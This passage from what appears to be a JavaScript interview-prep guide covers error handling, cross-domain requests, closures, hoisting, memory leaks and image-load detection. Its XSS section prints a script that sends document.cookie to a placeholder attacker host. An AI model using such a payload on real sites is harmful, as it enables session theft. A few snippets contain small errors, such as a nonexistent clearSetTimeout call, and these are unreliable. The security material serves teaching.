* Building a web site or application so it provides a good level of user experience in modern browsers. However, it will degrade gracefully for those using older browsers. The system may not be as pleasant or as pretty, but the basic functionality will work on older systems.

**Progressive Enhancement**
* The web site or application would establish a base-level of user experience for most browsers. More advanced functionality would then be added when a browser supports it.

#### 31. How are errors gracefully handled in JavaScript?
* handled via try/catch/finally blocks; this allows you to avoid those unfriendly error messages

```javascript
try {
    somefunction();
} catch(error) {
    if (error instanceof TypeError) {
        // Handle type Error
    } else if (error instanceof ReferenceError) {
        // Handle ReferenceError
    } else {
        // Handle all other error types
    }
}

```

* **window.onerror** event -- monitor all errors on a page, code syntax errors and runtime exceptions.

```javascript
window.onerror = function (errorMsg, url, lineNumber, column, errorObj) {
    alert('Error: ' + errorMsg + ' Script: ' + url + ' Line: ' + lineNumber
    + ' Column: ' + column + ' StackTrace: ' +  errorObj);
}
```

#### 32. How to handle cross domain request in JavaScript?
Read: https://jvaneyck.wordpress.com/2014/01/07/cross-domain-requests-in-javascript/

##### CORS (Cross-Origin Resource Sharing)
* Support all type of HTTP requests
* Server need to return additional HTTP headers
* Not supported on older versions of Internet Explorer. For “complex” requests, needs to make an extra HTTP call (preflighted requests). Some firewalls strip CORS headers.
```
//Response example
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://localhost:3000
Content-Type: application/json; charset=utf-8
Content-Length: 62

{
"response": "This is data returned from the CORS server"
}

```

##### JSONP (JavaScript Object Notation with Padding)
* only be used to perform Cross-Domain GET requests
* Server side must support JSONP. JSONP could expose your website to a plethora of security vulnerabilities if the server is compromised

```
//Server request
GET /?callback=myCallbackFunction HTTP/1.1

//Response
HTTP/1.1 200 OK
Content-Type: application/javascript

myCallbackFunction({'response': 'hello world from JSONP!'});

//Script block that get evaluated as soon as browser receive it
<script>
    function myCallbackFunction(data){
        $('body').text(data.response);
    }
</script>

```

##### SERVER-SIDE PROXY
* No server-side modification required (but you need an extra proxy component in your origin)
* Back-end performs the request instead of the browser. Could prove problematic for authentication

```
//Example request
GET /proxy?urlToFetch=http%3A%2F%2Flocalhost%3A3001 HTTP/1.1

//Example response
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{ "response": "This is data returned from the server, proxy style!" }
```

#### 33. Function declaration (Defined at run time vs. defined at parse time)

* One of the advantages of run time **function declaration** is that you can declare function based on certain condition.
* We COULD NOT do the same thing if using functioning defined at parse time

```javascript
// Run-Time function declaration
<script>
if(testCondition) {// If testCondition is true then
  var foo = function() {
    console.log("inside Foo with testCondition True value");
  };
} else {
  var foo = function() {
    console.log("inside Foo with testCondition false value");
  };
}
</script>
```

```javascript
// Parse-Time function declaration
<script>
bar(); // Call bar function here, It will not give an Error
function bar() {
  console.log("Hi I am inside Foo");
};
</script>
```

#### 34. What is difference between private variable, public variable and static variable? How we achieve this in JS?

Read: http://robertnyman.com/2008/10/14/javascript-how-to-get-private-privileged-public-and-static-members-properties-and-methods/

* Create a full JS object that contains private, priviledge, static, public variable as following
```javascript
// Constructor
function Kid (name) {
  // Private
  var idol = "Paris Hilton"; //Cannot access private property

  // Privileged
  this.getIdol = function () {
    return idol;
  };

  // Public
  this.name = name;
}

// Public
Kid.prototype.getName = function () {
  return this.name;
};

// Static property
Kid.town = "South Park"; //cannot access static from a new instance created

```

* The following is result when you try to access the property

```javascript
// Create a new instance
var cartman = new Kid("Cartman");

// Access private property
cartman.idol; // undefined

// Access privileged method
cartman.getIdol(); // "Paris Hilton"

// Access public property
cartman.name; // "Cartman"

// Access public method
cartman.getName(); // "Cartman"

// Access static property on an instance
cartman.town; // undefined

// Access static property on the constructor object
Kid.town; // "South Park"

```
#### 35. CommonJS vs. AMD

Read: http://stackoverflow.com/questions/16521471/relation-between-commonjs-amd-and-requirejs

**AMD (Asynchrounous Module definition)**
* browser-first approach
* Opting for asynchronous behavior and simplified backwards compatibility
* doesn't have any concept of File I/O.
* It supports objects, functions, constructors, strings, JSON and many other types of modules.

**CommonJS**
* server-first approach
* Assuming synchronous behavior
* Cover a broader set of concerns such as I/O, File system, Promises and more.
* Supports unwrapped modules, it can feel a little more close to the ES.next/Harmony specifications, freeing you of the define() wrapper that AMD enforces.
* **Only support objects as modules**


#### 36. Function length and method overloading

* We could use function length to get number of arguments passed in function call
* Can use this to leverage method overloading
```javascript
//Apply different function call based on function length
function addMethod(object, name, fn) {
  // Save a reference to the old method
  var old = object[ name ];

  // Overwrite the method with our new one
  object[ name ] = function(){
    // Check the number of incoming arguments,
    // compared to our overloaded function
    if ( fn.length == arguments.length )
      // If there was a match, run the function
      return fn.apply( this, arguments );

    // Otherwise, fallback to the old method
    else if ( typeof old === "function" )
      return old.apply( this, arguments );
  };
}
```

#### 37.1 What is malicious JS and its consequences?

* JavaScript has access to some of the user's sensitive information, such as cookies.
* JavaScript can send HTTP requests with arbitrary content to arbitrary destinations by using XMLHttpRequest and other mechanisms.
* JavaScript can make arbitrary modifications to the HTML of the current page by using DOM manipulation methods.

###### Consequences:

* **Cookies theft** The attacker can access the victim's cookies associated with the website using document.cookie, send them to his own server, and use them to extract sensitive information like session IDs.

* **Keylogging** The attacker can register a keyboard event listener using addEventListener and then send all of the user's keystrokes to his own server, potentially recording sensitive information such as passwords and credit card numbers.

* **Phishing** The attacker can insert a fake login form into the page using DOM manipulation, set the form's action attribute to target his own server, and then trick the user into submitting sensitive information.

#### 37.2 What is XSS attack?

Referenced:
* http://www.veracode.com/security/xss
* http://excess-xss.com/

```javascript
<script>
window.location='http://attacker/?cookie='+document.cookie
</script>

```

#### 38. How to set delay time for autocomplete request? (Apple Interview)

* We could leverage setTimeout() for this

```javascript
var timer;
function onKeyUp() {
    if (timer) {
        clearSetTimeout();
    }

    timer = setTimeout(function() {
        displaySearch();
    }, 3000);
}
function displaySearch() {
    alert('result');
}

```

#### 39. HashTable in JS
* Concept of associative arrays
* Read: https://gist.github.com/alexhawkins/f6329420f40e5cafa0a4

#### 40. Writing shim for Object.keys() function

```javascript

Object.prototype.keys = Object.prototype.keys || function(obj) {
  var keys = [];
  for (var key in obj) {
    keys.push(key);
  }
  return keys;
}

```

#### 41. What is the difference between declaring methods on the prototype level or in the constructor?

* Declaring methods on the prototype more efficient, especially for large number of objects because the method declaration will only exists in the prototype. However all methods will be public. Declaring it in the constructor method does not have this advantage but we can make methods private or public as we needed. This help to fulfill OO principle: Encapsulation.


#### 42. Checking idle time on browser

* The idea of checking idle time is checking if onmouse/onkey event has not been active for certain amount of time

````javascript
var IDLE_TIMEOUT = 60; //seconds
var _idleSecondsTimer = null;
var _idleSecondsCounter = 0;

document.onclick = function() {
  _idleSecondsCounter = 0;
};

document.onmousemove = function() {
  _idleSecondsCounter = 0;
};

document.onkeypress = function() {
  _idleSecondsCounter = 0;
};

//polling for idle time
_idleSecondsTimer = window.setInterval(CheckIdleTime, 1000);

function CheckIdleTime() {
  _idleSecondsCounter++;
  var oPanel = document.getElementById("SecondsUntilExpire");
  if (oPanel)
    oPanel.innerHTML = (IDLE_TIMEOUT - _idleSecondsCounter) + "";
  if (_idleSecondsCounter >= IDLE_TIMEOUT) {
    window.clearInterval(_idleSecondsTimer);
    alert("Time expired!");
    document.location.href = "logout.html";
  }
}
```

#### 43. Javascript performance testing

Discuss about ```performance.timing```, object could be accessed from any browser's console. Good read from: http://analyticsdemystified.com/google-analytics/hard-truth-measuring-page-load-time/

* redirectStart and redirectEnd: If your site uses a lot of redirects, it could definitely be useful to include that in your page load time calculation. I’ve only seen these values populated in rare cases – but they’re worth considering.
fetchStart: This marks the time when the browser first starts the process of loading the next page.
* requestStart: This marks the time when the browser requests the next page, either from a remote server or from its local cache.
responseEnd: This marks the time when the browser downloads the last byte of the page, but before the page is actually loaded into the DOM for the user.
* domLoading: This marks the time when the browser starts loading the page into the DOM.
* domInteractive: This marks the time when enough of the page has loaded for the user to begin interacting with it.
* domContentLoaded: This marks the time when all HTML and CSS are parsed into the DOM. If you’re familiar with jQuery, this is basically the same as jQuery’s “ready” event (“ready” does a bit more, but it’s close enough).
* domComplete: This marks the time when all images, iframes, and other resources are loaded into the DOM.
* loadEventStart and loadEventComplete: These mean that the window’s “onload” event has started (and completed), and indicate that the page is finally, officially loaded.

```javascript
function getPageLoadTime() {
  if (typeof(performance) !== 'undefined' && typeof(performance.timing) == 'object') {
    var timing = performance.timing;

    // fall back to less accurate milestones
    var startTime = performance.timing.redirectStart ||
            performance.timing.fetchStart ||
            performance.timing.requestStart;
    var endTime = performance.timing.domContentLoadedEventEnd ||
            performance.timing.domInteractive ||
            performance.timing.domComplete ||
            performance.timing.loadEventComplete;

    if (startTime && endTime && (startTime < endTime)) {
      return (endTime - startTime);
    }
  }

  return 'data not available';
}

```

#### 44. Parsing XML DOM

```javascript
//From DOM to String
var XMLS = new XMLSerializer();
var elem = document;
var xml_str = XMLS.serializeToString(elem);
console.log(xml_str);


/************** OR *******************/

//Parsing from String to DOM
var parser = new DOMParser();
var doc = parser.parseFromString(xml_str, "application/xml");
console.log(doc);

```

#### 45. What is hoisting in JS
Hoisting is JavaScript's default behavior of moving declarations to the top.

```javascript
x = 5; // Assign 5 to x

elem = document.getElementById("demo"); // Find an element
elem.innerHTML = x;                     // Display x in the element

var x; // Declare x
```


#### 46. Is JavaScript a pass-by-reference or pass-by-value language?

* Passed By Value: Number, string (primitive types), Object (sometimes)
* Passed By Referenced: Object

```javascript
function changeStuff(a, b, c) {
  a = a * 10;
  b.item = "changed"; //pass by referenced
  c = {item: "changed"};
}

var num = 10;
var obj1 = {item: "unchanged"};
var obj2 = {item: "unchanged"};

changeStuff(num, obj1, obj2);

console.log(num); //10
console.log(obj1.item); //changed
console.log(obj2.item); //unchanged
```

```javascript
function changeObject(x) {
  x = {member:"bar"};
  alert("in changeObject: " + x.member);
}

function changeMember(x) {
  x.member = "bar";
  alert("in changeMember: " + x.member);
}

var x = {member:"foo"};

alert("before changeObject: " + x.member); //foo
changeObject(x); //bar
alert("after changeObject: " + x.member); /* change did not persist */ //foo

alert("before changeMember: " + x.member); //foo
changeMember(x); //var
alert("after changeMember: " + x.member); /* change persists */ //bar

```

#### 47. What could cause JS memory leak?
* Referenced from: https://auth0.com/blog/four-types-of-leaks-in-your-javascript-code-and-how-to-get-rid-of-them/

1. Accidental global variable ==> Add **use strict** at the beginning of JS files to enable stricter mode and prevent accidental globals

```javascript
function foo(arg) {
  bar = "this is a hidden global variable";
}

//OR
function foo() {
  this.variable = "potential accidental global";
}

//Similar to
function foo(arg) {
  window.bar = "this is an explicit global variable";
}

```

2. Forgotten times or callbacks

```javascript
var someResource = getData();
setInterval(function() {
  var node = document.getElementById('Node'); //unused "node" should be destroyed
  if(node) {
    // Do stuff with node and someResource.
    node.innerHTML = JSON.stringify(someResource);
  }
}, 1000);
```

Best practice in this case is unbind/destroy node when not used

```javascript
var element = document.getElementById('button');

function onClick(event) {
  element.innerHtml = 'text';
}

element.addEventListener('click', onClick);
// Do stuff
element.removeEventListener('click', onClick);
element.parentNode.removeChild(element);
// Now when element goes out of scope,
// both element and onClick will be collected even in old browsers that don't
// handle cycles well.
```

3. Out of DOM references
* When 2 refences to the sam DOM element are kept
* Suppose you keep a reference to a specific cell of a table (a <td> tag) in your JavaScript code. At some point in the future you decide to remove the table from the DOM but keep the reference to that cell. Intuitively one may suppose the GC will collect everything but that cell. In practice this won't happen: the cell is a child node of that table and children keep references to their parents. In other words, the reference to the table cell from JavaScript code causes the whole table to stay in memory. Consider this carefully when keeping references to DOM elements.

4. Closure

** Google Chrome profiling test code **

```javascript
var x = [];

function createSomeNodes() {
  var div,
      i = 100,
      frag = document.createDocumentFragment();
  for (;i > 0; i--) {
    div = document.createElement("div");
    div.appendChild(document.createTextNode(i + " - "+ new Date().toTimeString()));
    frag.appendChild(div);
  }
  document.getElementById("nodes").appendChild(frag);
}
function grow() {
  x.push(new Array(1000000).join('x'));
  createSomeNodes();
  setTimeout(grow,1000);
}

```

#### 48. Detect when image fails to load in Javascript

* Note: Whenever you assign onload or onerror directly, it may replace the callback that was assigned earlier. That is why there's a nice method that "registers the specified listener on the EventTarget it's called on" as they say on MDN. You can register as many listeners as you want on the same event.

```javascript
function testImage(url) {
  var tester = new Image();
  tester.addEventListener('load', imageFound);
  tester.addEventListener('error', imageNotFound);
  tester.src = url;
}

function imageFound() {
  alert('That image is found and loaded');
}

function imageNotFound() {
  alert('That image was not found.');
}

testImage("http://foo.com/bar.jpg");

```

* Now use ES6 and promise to write that function

```javascript
function testImage(url) {
  // Define the promise
  const imgPromise = new Promise(function(resolve, reject) {
    // Create the image
    const imgElement = new Image();

    // When image is loaded, resolve the promise
    imgElement.addEventListener('load', function imgOnLoad() {
        resolve(this);
    });
    // When there's an error during load, reject the promise
    imgElement.addEventListener('error', function imgOnError() {
        reject();
    });
    // Assign URL
    imgElement.src = url;
  });
  return imgPromise;
}

testImage("http://foo.com/bar.jpg").then(
  function fulfilled(img) {
    console.log('That image is found and loaded', img);
  },

  function rejected() {
    console.log('That image was not found');
  }
);

```

* Another way to detect broken image (in this case, assume iamge is loaded, but broken). Referenced: https://stereochro.me/ideas/detecting-broken-images-js

```javascript
function isImageOk(img) {
  // During the onload event, IE correctly identifies any images that
  // weren't downloaded as not complete. Others should too. Gecko-based
  // browsers act like NS4 in that they report this incorrectly.
  if (!img.complete) {
    return false;
  }

  // However, they do have two very useful properties: naturalWidth and
  // naturalHeight. These give the true size of the image. If it failed
  // to load, either of these should be zero.
  if (typeof img.naturalWidth != "undefined" && img.naturalWidth == 0) {
    return false;
  }

  // No other way of checking: assume it's ok.
  return true;
}

addEvent(window, "load", function() {
  for (var i = 0; i < document.images.length; i++) {
    if (!isImageOk(document.images[i])) {
      document.images[i].style.visibility = "hidden";
    }
  }
});

```
